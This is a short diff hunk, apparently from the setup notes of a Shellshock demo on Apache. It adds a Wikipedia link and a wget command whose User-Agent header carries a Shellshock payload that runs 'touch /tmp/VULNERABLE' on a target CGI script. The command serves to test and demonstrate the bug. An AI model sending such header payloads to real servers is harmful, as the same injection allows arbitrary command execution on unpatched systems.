@@ -25,7 +25,7 @@ Shellshock demo root directory for Apache
 		allow from all
 	</Directory>
 
-
-
+https://en.wikipedia.org/wiki/Shellshock_(software_bug)
+wget -U "() { test;};/usr/bin/touch /tmp/VULNERABLE" myserver/cgi-bin/test
 
 `
